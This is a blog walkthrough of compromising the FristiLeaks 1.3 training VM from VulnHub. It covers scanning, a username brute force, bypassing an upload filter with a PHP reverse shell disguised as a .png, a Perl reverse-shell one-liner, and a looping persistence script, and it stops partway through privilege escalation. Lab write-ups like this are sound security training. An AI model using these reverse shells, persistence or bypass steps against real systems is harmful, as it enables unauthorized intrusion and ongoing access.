---
layout: post
title: "FristiLeaks: 1.3"
date: 2019-04-15 00:34:01 +0000
author: Larry Brown
category: Walkthroughs
tags: [vulnhub]
---
<div>VulnHub URL:Â <a href="https://www.vulnhub.com/entry/fristileaks-13,133/" target="_blank">https://www.vulnhub.com/entry/fristileaks-13,133/</a></div>
<div>Hostname: localhost</div>
<div>IP Address: 10.183.0.208</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Information Gathering/Recon</h2>
</div>
<div><br /></div>
<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.208.</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Service Enumeration/Scanning</h2>
</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/fristileaks13# nmap -Pn -sT -sV -A -oA fristileaks13 -p 1-65535 10.183.0.208</div>
    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-18 10:27 EDT</div>
    <div>Nmap scan report for 10.183.0.208</div>
    <div>Host is up (0.18s latency).</div>
    <div>Not shown: 65534 filtered ports</div>
    <div>PORTÂ Â Â STATE SERVICE VERSION</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp openÂ Â httpÂ Â Â Â Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</font>
    </div>
    <div>| http-methods:</div>
    <div>|_Â Â Potentially risky methods: TRACE</div>
    <div>| http-robots.txt: 3 disallowed entries</div>
    <div>|_/cola /sisi /beer</div>
    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.15</font> (CentOS) <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">DAV/2 PHP/5.3.3</font>
    </div>
    <div>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</div>
    <div>MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)</div>
    <div>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</div>
    <div>Device type: general purpose</div>
    <div>Running: Linux 2.6.X|3.X</div>
    <div>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</div>
    <div>OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13</div>
    <div>Network Distance: 1 hop</div>
    <div>
        <div><br /></div>
    </div>
    <div>TRACEROUTE</div>
    <div>HOP RTTÂ Â Â Â Â Â Â ADDRESS</div>
    <div>1Â Â Â 183.42 ms 10.183.0.208</div>
    <div>
        <div><br /></div>
    </div>
    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
    <div>Nmap done: 1 IP address (1 host up) scanned in 1493.27 seconds</div>
</div>
<div><br /></div>
<!--more-->
<div><br /></div>
<div>
    <h2>Gaining Access</h2>
</div>
<div><br /></div>
<div>Visiting the default site for the HTTP service just produces a sort of welcome page. Nmap already showed us some of the software versions in use, but let's use nikto to see if anything else shows up.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/fristileaks13# nikto -h http://10.183.0.208</div>
    <div>- Nikto v2.1.6</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ Target IP:Â Â Â Â Â Â Â Â Â Â 10.183.0.208</div>
    <div>+ Target Hostname:Â Â Â Â 10.183.0.208</div>
    <div>+ Target Port:Â Â Â Â Â Â Â Â 80</div>
    <div>+ Start Time:Â Â Â Â Â Â Â Â Â 2019-04-18 12:41:26 (GMT-4)</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.15</font> (CentOS) <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">DAV/2 PHP/5.3.3</font>
    </div>
    <div>+ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015</div>
    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
    <div>+ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
    <div>+ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
    <div>+ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)</div>
    <div>+ "robots.txt" contains 3 entries which should be manually viewed.</div>
    <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">PHP/5.3.3</font> appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.</div>
    <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.15</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
    <div>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE </div>
    <div>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</div>
    <div>+ OSVDB-3268: /icons/: Directory indexing found.</div>
    <div>+ OSVDB-3268: /images/: Directory indexing found.</div>
    <div>+ OSVDB-3233: /icons/README: Apache default file found.</div>
    <div>+ 8727 requests: 0 error(s) and 15 item(s) reported on remote host</div>
    <div>+ End Time:Â Â Â Â Â Â Â Â Â Â Â 2019-04-18 12:42:26 (GMT-4) (60 seconds)</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ 1 host(s) tested</div>
</div>
<div><br /></div>
<div>Searching the exploit database, the version of Apache in use has a known vulnerability.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Apache 2.2.15 mod_proxy - Reverse Proxy Security BypassÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/linux/remote/36663.txt</div>
    <div><span style="font-size: 12px; font-family: Monaco;">[...]</span></div>
    <div>Apache &lt; 2.0.64 / &lt; 2.2.21 mod_setenvif - Integer OverflowÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/linux/dos/41769.txt</div>
    <div>Apache &lt; 2.2.34 / &lt; 2.4.27 - OPTIONS Memory LeakÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/linux/webapps/42745.py</div>
</div>
<div><br /></div>
<div>Digging into the '36663.txt' vulnerability, this doesn't look promising for gaining remote access to the system. Specifically, "An attacker needs to host a malicious web application on the affected webserver."</div>
<div><br /></div>
<div>FromÂ <a href="https://www.securityfocus.com/bid/51869/exploit" target="_blank">https://www.securityfocus.com/bid/51869/exploit</a></div>
<div><img height="424" src="/assets/images/2019-04-15-fristileaks-1.3/C762DFCF-1223-4A4B-8A86-7E8F602D6491.png" width="1802" /><br /></div>
<div><br /></div>
<div>The exploit database has lots of potential issues for PHP 5.3.3.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>PHP 5.3.3 - 'ibase_gen_id()' Off-by-One OverflowÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/dos/14678.txt</div>
    <div>PHP 5.3.3 - NumberFormatter::getSymbol Integer OverflowÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/multiple/dos/15722.txt</div>
    <div>PHP 5.3.3/5.2.14 - ZipArchive::getArchiveComment Null Pointer DereferenceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/dos/15431.txt</div>
    <div>[...]</div>
    <div>PHP &lt; 5.3.12 / &lt; 5.4.2 - CGI Argument InjectionÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/remote/18836.py</div>
    <div>PHP &lt; 5.3.6 'OpenSSL' Extension - 'openssl_decrypt' Ciphertext Data Memory Leak Denial of ServiceÂ Â Â Â Â Â Â Â Â Â Â Â | exploits/php/dos/35487.php</div>
    <div>PHP &lt; 5.3.6 'OpenSSL' Extension - 'openssl_encrypt' Plaintext Data Memory Leak Denial of ServiceÂ Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/dos/35486.php</div>
    <div>PHP &lt; 5.3.6 'Zip' Extension - 'zip_fread()' Denial of ServiceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/dos/35485.php</div>
    <div>PHP &lt; 5.3.7 - Multiple Null Pointer Dereference Denial of Service VulnerabilitiesÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/php/dos/36070.txt</div>
</div>
<div><br /></div>
<div>The only one that seems to have potential isÂ 18836.py, but trying it doesn't produce the expected result. Moving on...</div>
<div><br /></div>
<div>None of the directories found by nikto produce anything useful. Let's see what dirb gives us.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/fristileaks13# dirb http://10.183.0.208 /usr/share/dirb/wordlists/big.txt -o dirb-http-10.183.0.208.txt</div>
    <div>
        <div><br /></div>
    </div>
    <div>-----------------</div>
    <div>DIRB v2.22</div>
    <div>By The Dark Raver</div>
    <div>-----------------</div>
    <div>
        <div><br /></div>
    </div>
    <div>OUTPUT_FILE: dirb-http-10.183.0.208.txt</div>
    <div>START_TIME: Thu Apr 18 12:46:49 2019</div>
    <div>URL_BASE: http://10.183.0.208/</div>
    <div>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt</div>
    <div>
        <div><br /></div>
    </div>
    <div>-----------------</div>
    <div>
        <div><br /></div>
    </div>
    <div>GENERATED WORDS: 20458</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Scanning URL: http://10.183.0.208/ ----</div>
    <div>==&gt; DIRECTORY: http://10.183.0.208/beer/</div>
    <div>+ http://10.183.0.208/cgi-bin/ (CODE:403|SIZE:210)</div>
    <div>==&gt; DIRECTORY: http://10.183.0.208/images/</div>
    <div>+ http://10.183.0.208/robots.txt (CODE:200|SIZE:62)</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.208/beer/ ----</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.208/images/ ----</div>
    <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div>
    <div>Â Â Â Â (Use mode '-w' if you want to scan it anyway)</div>
    <div>
        <div><br /></div>
    </div>
    <div>-----------------</div>
    <div>END_TIME: Thu Apr 18 12:50:24 2019</div>
    <div>DOWNLOADED: 40916 - FOUND: 2</div>
</div>
<div><br /></div>
<div>The only new directory dirb gave us is 'cgi-bin', but attempts to access it fail with a 403 Forbidden error.</div>
<div><br /></div>
<div>Let's think. Cola, sisi and beer are all drinks. So is 'fristi' (like the name of the VM,Â fristileaks). Let's try <a href="http://10.183.0.208/fristi/">http://10.183.0.208/fristi/</a></div>
<div><br /></div>
<div>Finally, something interesting.</div>
<div><br /></div>
<div><img height="1252" src="/assets/images/2019-04-15-fristileaks-1.3/900AC98A-1A3D-497E-AEE1-18F3F1B93D4B.png" width="1168" /><br /></div>
<div><br /></div>
<div><br /></div>
<div>Viewing the page source, we see images are displayed inline as base64. We notice there is a commented out block of base64 text, so we copy it and decode it here.</div>
<div><br /></div>
<div><a href="https://codebeautify.org/base64-to-image-converter" target="_blank">https://codebeautify.org/base64-to-image-converter</a></div>
<div><img height="810" src="/assets/images/2019-04-15-fristileaks-1.3/03588FA6-3B9D-4062-99EE-CF8B4DF7FE33.png" width="2176" /><br /></div>
<div><br /></div>
<div>Nice. Looks like a password. Now, what about a username? We manually try some obvious ones (admin, root, etc), but no dice. Next, we decide to try to brute force the username using wfuzz.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>wfuzz -c -z file,/usr/share/wordlists/metasploit/namelist.txt -t 50 -X POST -d "myusername=FUZZ&amp;mypassword=keKkeKKeKKeKkEkkEk&amp;Submit=Login" -H "Referer: http://10.183.0.208/fristi/" --hh 26 http://10.183.0.208/fristi/checklogin.php</div>
</div>
<div><br /></div>
<div>Unfortunately, this also yields no results. Let's see if the username is also "hidden" in the login page source code.</div>
<div><br /></div>
<div>At the top of the page, there is a comment from 'eezeepz'.</div>
<div><br /></div>
<div><img height="186" src="/assets/images/2019-04-15-fristileaks-1.3/4D937256-EAA0-43A7-9731-8A65D1CE0497.png" width="1402" /><br /></div>
<div><br /></div>
<div>Let's try 'eezeepz' as the username and 'keKkeKKeKKeKkEkkEk' as the password.</div>
<div><br /></div>
<div>Works! ðŸ˜„ And we get to upload a file. I'm thinking, shell.</div>
<div><br /></div>
<div><img height="116" src="/assets/images/2019-04-15-fristileaks-1.3/16DB0205-6501-4972-A92B-86EADE97A050.png" width="238" /><br /></div>
<div><br /></div>
<div>After clicking the link, we are taken to <a href="http://10.183.0.208/fristi/upload.php">http://10.183.0.208/fristi/upload.php</a>Â to upload an image. I'm thinking... not shell?!? ðŸ˜ž</div>
<div><br /></div>
<div><img height="100" src="/assets/images/2019-04-15-fristileaks-1.3/B74FF649-B870-419A-B9E9-8451174FA3FA.png" width="682" /><br /></div>
<div><br /></div>
<div>Let's see how strong the input validation is. When trying to upload a random TXT file I get the following back.</div>
<div><br /></div>
<div><img height="44" src="/assets/images/2019-04-15-fristileaks-1.3/1D45F45F-B1CC-4F2C-AF59-3F2407B75CB1.png" width="359" /><br /></div>
<div><br /></div>
<div>Fair enough. Now the question is, are they checking the file extension or the file type/mime type (provided in the request). Let's try this again, using Burp to intercept the request and try to bypass the upload restrictions... [several minutes later] so... I wasn't able to make any manipulations to bypass the restriction. I guess we can just try uploading our PHP reverse shell code with an acceptable extension and see what happens. (According to the <a href="https://httpd.apache.org/docs/2.4/mod/mod_mime.html#multipleext" target="_blank">Apache documentation</a>, "Care should be taken when a file with multiple extensions gets associated with both a media-type and a handler. This will usually result in the request being handled by the module associated with the handler." So, since an image is a media-type and PHP has a handler, the file.php.png gets processed by the handler... which is good for us.)</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/fristileaks13# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div>
    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
    <div>[-] No arch selected, selecting arch: php from the payload</div>
    <div>No encoder or badchars specified, outputting raw payload</div>
    <div>Payload size: 3057 bytes</div>
    <div>root@kali:~/Walkthroughs/fristileaks13# mv rev.php rev.php.png</div>
</div>
<div><br /></div>
<div>I use msfvenom to create the PHP reverse shell code and rename the file as rev.php.png. Uploading this file to the server works and tells me the file is located under /uploads.</div>
<div><br /></div>
<div><img height="47" src="/assets/images/2019-04-15-fristileaks-1.3/8FFCE135-A871-485C-A6B4-508683AFACB9.png" width="259" /><br /></div>
<div><br /></div>
<div>Time to start my listeners in Metasploit. Because the PHP reverse shell times out rather quickly, I typically like to start two listeners and jump to a different reverse shell as soon as the first one connects.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>msf5 &gt; use exploit/multi/handler</div>
    <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
    <div>payload =&gt; php/reverse_php</div>
    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
    <div>LHOST =&gt; 10.183.0.222</div>
    <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
    <div>LPORT =&gt; 5432</div>
    <div>msf5 exploit(multi/handler) &gt; run -j</div>
    <div>[*] Exploit running as background job 0.</div>
    <div>[*] Exploit completed, but no session was created.</div>
    <div>
        <div><br /></div>
    </div>
    <div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div>
    <div>msf5 exploit(multi/handler) &gt; </div>
    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
    <div>payload =&gt; generic/shell_reverse_tcp</div>
    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
    <div>LHOST =&gt; 10.183.0.222</div>
    <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
    <div>LPORT =&gt; 5433</div>
    <div>msf5 exploit(multi/handler) &gt; run -j</div>
    <div>[*] Exploit running as background job 1.</div>
    <div>[*] Exploit completed, but no session was created.</div>
    <div>
        <div><br /></div>
    </div>
    <div>[*] Started reverse TCP handler on 10.183.0.222:5433</div>
</div>
<div><br /></div>
<div>With the listeners started, I request my PHP reverse shell "image" fromÂ <a href="http://10.183.0.208/fristi/uploads/rev.php.png">http://10.183.0.208/fristi/uploads/rev.php.png</a>... and my session connects...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.208:40599) at 2019-04-18 16:20:45 -0400</div>
    <div>
        <div><br /></div>
    </div>
    <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
    <div>[*] Starting interaction with 1...</div>
    <div>
        <div><br /></div>
    </div>
    <div>pwd</div>
    <div>/var/www/html/fristi/uploads</div>
    <div>id</div>
    <div>uid=48(apache) gid=48(apache) groups=48(apache)</div>
    <div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div>
    <div>[*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.208:37332) at 2019-04-18 16:21:09 -0400</div>
    <div>
        <div><br /></div>
    </div>
    <div>background</div>
    <div>
        <div><br /></div>
    </div>
    <div>Background session 1? [y/N]Â Â y</div>
    <div>msf5 exploit(multi/handler) &gt; sessions 2</div>
    <div>[*] Starting interaction with 2...</div>
    <div>
        <div><br /></div>
    </div>
    <div>sh-4.1$ id</div>
    <div>id</div>
    <div>uid=48(apache) gid=48(apache) groups=48(apache)</div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Maintaining Access</h2>
</div>
<div><br /></div>
<div>I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes and use python'sÂ SimpleHTTPServer to serve it up to the victim.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/fristileaks13# cat thumbs</div>
    <div>#!/bin/sh</div>
    <div>while true; do</div>
    <div>Â Â Â Â perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div>
    <div>Â Â Â Â # sleep for 300 seconds (5 mins)</div>
    <div>Â Â Â Â sleep 300</div>
    <div>done</div>
    <div>
        <div>root@kali:~/Walkthroughs/fristileaks13# python -m SimpleHTTPServer 4321</div>
    </div>
    <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
    <div>10.183.0.208 - - [18/Apr/2019 16:37:36] "GET /thumbs HTTP/1.0" 200 -</div>
</div>
<div><br /></div>
<div>I downloaded the script to the victim's /var/www/html/fristi/uploadsÂ directory and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>sh-4.1$ wget -O thumbs 10.183.0.222:4321/thumbs</div>
    <div>wget -O thumbs 10.183.0.222:4321/thumbs</div>
    <div>--2019-04-18 16:37:36--Â Â http://10.183.0.222:4321/thumbs</div>
    <div>Connecting to 10.183.0.222:4321... connected.</div>
    <div>HTTP request sent, awaiting response... 200 OK</div>
    <div>Length: 307 [application/octet-stream]</div>
    <div>Saving to: `thumbs'</div>
    <div>
        <div><br /></div>
    </div>
    <div>Â Â Â Â Â 0KÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 100% 61.5M=0s</div>
    <div>
        <div><br /></div>
    </div>
    <div>2019-04-18 16:37:36 (61.5 MB/s) - `thumbs' saved [307/307]</div>
    <div>
        <div><br /></div>
    </div>
    <div>sh-4.1$ chmod +x thumbs</div>
    <div>chmod +x thumbs</div>
    <div>sh-4.1$ ./thumbs &amp;</div>
    <div>./thumbs &amp;</div>
    <div>[1] 23405</div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Privilege Escalation</h2>
</div>
<div><br /></div>
<div>Looking around in theÂ /var/www/html/fristi directory, I wanted to see if the login credentials we used were hard coded or coming from a database. I checked the 'checklogin.php' file and found the page is using a backend MySQL database and the database credentials are stored in the page source.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>bash-4.1$ cat checklogin.php</div>
    <div>&lt;?php</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>ob_start();</div>
    <div>$host="localhost"; // Host name</div>
    <div>$username="eezeepz"; // Mysql username</div>
    <div>$password="4ll3maal12#"; // Mysql password</div>
    <div>$db_name="hackmenow"; // Database name</div>
    <div>$tbl_name="members"; // Table name</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>// Connect to server and select databse.</div>
    <div>mysql_connect("$host", "$username", "$password")or die("cannot connect");</div>
    <div>mysql_select_db("$db_name")or die("cannot select DB");</div>
    <div>[...]</div>
</div>
<div><br /></div>
<div>Dropping back directory by directory and checking out interesting files, we find a notes.txt file inÂ /var/www.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>bash-4.1$ cat notes.txt</div>
    <div>hey eezeepz your homedir is a mess, go clean it up, just dont delete</div>
    <div>the important stuff.</div>
    <div>
        <div><br /></div>
    </div>
    <div>-jerry</div>
</div>
<div><br /></div>
<div>So, looks like we should take a look atÂ eezeepz's home directory. Let's see where that is exactly.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>bash-4.1$ grep eezeepz /etc/passwd</div>
    <div>eezeepz:x:500:500::/home/eezeepz:/bin/bash</div>
</div>
<div><br /></div>
<div>Right where you'd expect. Before going over there, though, we'll keep looking around.</div>
<div><br /></div>
<div>As we keep stepping back, we notice the directory /var/fristigod. That seems interesting, so we might come back to it later. We don't currently have permissions.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>drwxr-x---Â Â Â 3 fristigod fristigod 4096 Nov 25Â Â 2015 fristigod</div>
</div>
<div><br /></div>
<div>Checking /home, we see the following.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>bash-4.1$ cd /home</div>
    <div>bash-4.1$ ls -l</div>
    <div>ls -l</div>
    <div>total 20</div>
    <div>drwx------. 2 adminÂ Â Â Â Â adminÂ Â Â Â Â Â 4096 Nov 19Â Â 2015 admin</div>
    <div>drwx---r-x. 5 eezeepzÂ Â Â eezeepzÂ Â Â 12288 Nov 18Â Â 2015 eezeepz</div>
    <div>drwx------Â Â 2 fristigod fristigodÂ Â 4096 Nov 19Â Â 2015 fristigod</div>
</div>
<div><br /></div>
<div>The home directory forÂ eezeepz contains several executables, plus another notes.txt from Jerry.</div>
<div><br /></div>
